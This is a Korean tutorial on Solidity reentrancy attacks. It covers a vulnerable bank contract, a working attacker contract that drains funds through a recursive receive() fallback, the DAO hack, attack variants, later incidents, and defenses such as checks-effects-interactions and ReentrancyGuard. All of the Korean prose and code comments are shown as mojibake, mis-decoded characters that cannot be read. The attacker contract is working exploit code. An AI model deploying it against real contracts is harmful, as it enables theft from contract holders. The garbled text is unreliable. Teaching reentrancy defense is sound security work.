
## ğŸ”„ **ì¬ì§„ì… ê³µê²©ì´ë€?**

ì¬ì§„ì… ê³µê²©ì€ ìŠ¤ë§ˆíŠ¸ ì»¨íŠ¸ë™íŠ¸ê°€ **ì™¸ë¶€ ì»¨íŠ¸ë™íŠ¸ë¥¼ í˜¸ì¶œí•˜ëŠ” ë™ì•ˆ**, í•´ë‹¹ ì™¸ë¶€ ì»¨íŠ¸ë™íŠ¸ê°€ **ì›ë˜ í•¨ìˆ˜ë¥¼ ë‹¤ì‹œ í˜¸ì¶œ**í•˜ì—¬ ì˜ˆìƒì¹˜ ëª»í•œ ë™ì‘ì„ ìœ ë°œí•˜ëŠ” ê³µê²©ì…ë‹ˆë‹¤.

## âš ï¸ **ê³µê²© ë©”ì»¤ë‹ˆì¦˜**

### **ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œ:**

```solidity
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "ì”ì•¡ ë¶€ì¡±");
        
        // âŒ ìœ„í—˜: ìƒíƒœ ì—…ë°ì´íŠ¸ ì „ì— ì™¸ë¶€ í˜¸ì¶œ
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ì „ì†¡ ì‹¤íŒ¨");
        
        // ìƒíƒœ ì—…ë°ì´íŠ¸ê°€ ë„ˆë¬´ ëŠ¦ìŒ
        balances[msg.sender] -= amount;
    }
}
```

### **ê³µê²©ì ì»¨íŠ¸ë™íŠ¸:**

```solidity
contract Attacker {
    VulnerableBank public bank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    function attack() public payable {
        // 1. ìµœì†Œí•œì˜ ì˜ˆê¸ˆ
        bank.deposit{value: ATTACK_AMOUNT}();
        
        // 2. ì¶œê¸ˆ ì‹œì‘ (ì¬ì§„ì… íŠ¸ë¦¬ê±°)
        bank.withdraw(ATTACK_AMOUNT);
    }
    
    // 3. fallback í•¨ìˆ˜ì—ì„œ ì¬ì§„ì… ë°œìƒ
    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            bank.withdraw(ATTACK_AMOUNT); // ğŸ”„ ì¬ê·€ í˜¸ì¶œ!
        }
    }
}
```

## ğŸ” **ê³µê²© ê³¼ì • ë‹¨ê³„ë³„ ë¶„ì„**

```
1ï¸âƒ£ ê³µê²©ìê°€ withdraw(1 ETH) í˜¸ì¶œ
   â””â”€ ì”ì•¡ í™•ì¸: âœ… (1 ETH ë³´ìœ )

2ï¸âƒ£ msg.sender.call{value: 1 ETH}() ì‹¤í–‰
   â””â”€ ê³µê²©ìì˜ receive() í•¨ìˆ˜ í˜¸ì¶œë¨

3ï¸âƒ£ receive() í•¨ìˆ˜ì—ì„œ withdraw(1 ETH) ì¬í˜¸ì¶œ
   â””â”€ ì”ì•¡ í™•ì¸: âœ… (ì•„ì§ ì°¨ê°ë˜ì§€ ì•ŠìŒ!)

4ï¸âƒ£ ë˜ë‹¤ì‹œ msg.sender.call{value: 1 ETH}() ì‹¤í–‰
   â””â”€ ë¬´í•œ ë£¨í”„...

5ï¸âƒ£ ì»¨íŠ¸ë™íŠ¸ ì”ì•¡ì´ ì†Œì§„ë  ë•Œê¹Œì§€ ë°˜ë³µ
```

## ğŸ›ï¸ **The DAO í•´í‚¹ (2016ë…„)**

**ì—­ì‚¬ìƒ ê°€ì¥ ìœ ëª…í•œ ì¬ì§„ì… ê³µê²©:**

- **í”¼í•´ì•¡**: ì•½ 6ì²œë§Œ ë‹¬ëŸ¬ (360ë§Œ ETH)
- **ê²°ê³¼**: ì´ë”ë¦¬ì›€ í•˜ë“œí¬í¬ë¡œ ì´ë”ë¦¬ì›€ í´ë˜ì‹(ETC) íƒ„ìƒ
- **ì·¨ì•½ì **: splitDAO í•¨ìˆ˜ì˜ ì¬ì§„ì… ë²„ê·¸

```solidity
// The DAOì˜ ì·¨ì•½í•œ ì½”ë“œ (ë‹¨ìˆœí™”)
function withdraw() {
    uint amount = balances[msg.sender];
    
    // ì¬ì§„ì… ì·¨ì•½ì 
    if (msg.sender.call.value(amount)()) {
        balances[msg.sender] = 0;  // ë„ˆë¬´ ëŠ¦ìŒ!
    }
}
```

## ğŸ›¡ï¸ **ë°©ì–´ ë°©ë²•ë“¤**

### **1. Checks-Effects-Interactions íŒ¨í„´**

```solidity
function withdraw(uint256 amount) public {
    // 1ï¸âƒ£ Checks: ì¡°ê±´ í™•ì¸
    require(balances[msg.sender] >= amount, "ì”ì•¡ ë¶€ì¡±");
    
    // 2ï¸âƒ£ Effects: ìƒíƒœ ë³€ê²½ ë¨¼ì €!
    balances[msg.sender] -= amount;
    
    // 3ï¸âƒ£ Interactions: ì™¸ë¶€ í˜¸ì¶œì€ ë§ˆì§€ë§‰ì—
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "ì „ì†¡ ì‹¤íŒ¨");
}
```

### **2. ReentrancyGuard ì‚¬ìš©**

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 amount) public nonReentrant {
        require(balances[msg.sender] >= amount, "ì”ì•¡ ë¶€ì¡±");
        
        balances[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ì „ì†¡ ì‹¤íŒ¨");
    }
}
```

### **3. Pull over Push íŒ¨í„´**

```solidity
contract SecureBank {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public withdrawalAllowance;
    
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        
        // ì¶œê¸ˆ í—ˆìš©ëŸ‰ë§Œ ì„¤ì •
        withdrawalAllowance[msg.sender] += amount;
        balances[msg.sender] -= amount;
    }
    
    function pullPayment() public {
        uint256 amount = withdrawalAllowance[msg.sender];
        withdrawalAllowance[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}
```

## ğŸ”„ **ì¬ì§„ì… ê³µê²©ì˜ ë³€í˜•ë“¤**

### **1. Single Function Reentrancy**

- ê°™ì€ í•¨ìˆ˜ë¥¼ ì¬ê·€ì ìœ¼ë¡œ í˜¸ì¶œ

### **2. Cross-Function Reentrancy**

```solidity
// ì·¨ì•½í•œ ì˜ˆì‹œ
contract Vulnerable {
    mapping(address => uint256) public balances;
    
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        msg.sender.call{value: amount}("");
        balances[msg.sender] = 0;
    }
    
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount);
        balances[to] += amount;
        balances[msg.sender] -= amount;  // ë‹¤ë¥¸ í•¨ìˆ˜ ìƒíƒœ ì˜í–¥
    }
}
```

### **3. Cross-Contract Reentrancy**

- ì—¬ëŸ¬ ì»¨íŠ¸ë™íŠ¸ ê°„ ìƒíƒœ ê³µìœ ë¡œ ì¸í•œ ì¬ì§„ì…

### **4. Read-Only Reentrancy**

```solidity
// ERC-4626 ë³¼íŠ¸ì˜ ì·¨ì•½ì  ì˜ˆì‹œ
function balanceOf(address user) public view returns (uint256) {
    // ì¬ì§„ì… ì¤‘ ì¼ê´€ì„± ì—†ëŠ” ìƒíƒœ ë°˜í™˜ ê°€ëŠ¥
    return vault.totalAssets() * shares[user] / totalSupply();
}
```

## ğŸš¨ **ìµœì‹  ì¬ì§„ì… ê³µê²© ì‚¬ë¡€ë“¤**

### **1. Cream Finance (2021)**

- **í”¼í•´ì•¡**: 1ì–µ 3ì²œë§Œ ë‹¬ëŸ¬
- **ë°©ì‹**: í¬ë¡œìŠ¤ í”„ë¡œí† ì½œ ì¬ì§„ì…

### **2. Fei Protocol (2022)**

- **í”¼í•´ì•¡**: 8ì²œë§Œ ë‹¬ëŸ¬
- **ë°©ì‹**: ë³µí•© ì¬ì§„ì… ê³µê²©

### **3. Paraluni (2022)**

- **í”¼í•´ì•¡**: 170ë§Œ ë‹¬ëŸ¬
- **ë°©ì‹**: ì½ê¸° ì „ìš© ì¬ì§„ì…

## ğŸ’¡ **ê°œë°œìë¥¼ ìœ„í•œ ì²´í¬ë¦¬ìŠ¤íŠ¸**

```solidity
// âœ… ì˜¬ë°”ë¥¸ íŒ¨í„´
function secureWithdraw(uint256 amount) external nonReentrant {
    // 1. ëª¨ë“  ì¡°ê±´ í™•ì¸
    require(amount <= balances[msg.sender], "ì”ì•¡ ë¶€ì¡±");
    require(amount > 0, "0ë³´ë‹¤ í° ê¸ˆì•¡ í•„ìš”");
    
    // 2. ìƒíƒœ ë³€ê²½
    balances[msg.sender] -= amount;
    
    // 3. ì´ë²¤íŠ¸ ë°œí–‰
    emit Withdrawal(msg.sender, amount);
    
    // 4. ì™¸ë¶€ í˜¸ì¶œ (ê°€ì¥ ë§ˆì§€ë§‰)
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "ì „ì†¡ ì‹¤íŒ¨");
}
```

## ğŸ”§ **ê²€ì¦ ë„êµ¬ë“¤**

1. **Slither**: ì •ì  ë¶„ì„ ë„êµ¬
2. **MythX**: ì¬ì§„ì… íŒ¨í„´ íƒì§€
3. **Echidna**: í¼ì§• í…ŒìŠ¤íŠ¸
4. **Manticore**: ì‹¬ë³¼ë¦­ ì‹¤í–‰

ì¬ì§„ì… ê³µê²©ì€ ë¸”ë¡ì²´ì¸ ë³´ì•ˆì˜ ê¸°ì´ˆì´ì ê°€ì¥ ì¹˜ëª…ì ì¸ ê³µê²© ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **í•­ìƒ ìƒíƒœ ë³€ê²½ì„ ì™¸ë¶€ í˜¸ì¶œë³´ë‹¤ ë¨¼ì € ìˆ˜í–‰**í•˜ëŠ” ê²ƒì´ í•µì‹¬ ë°©ì–´ ì›ì¹™ì…ë‹ˆë‹¤!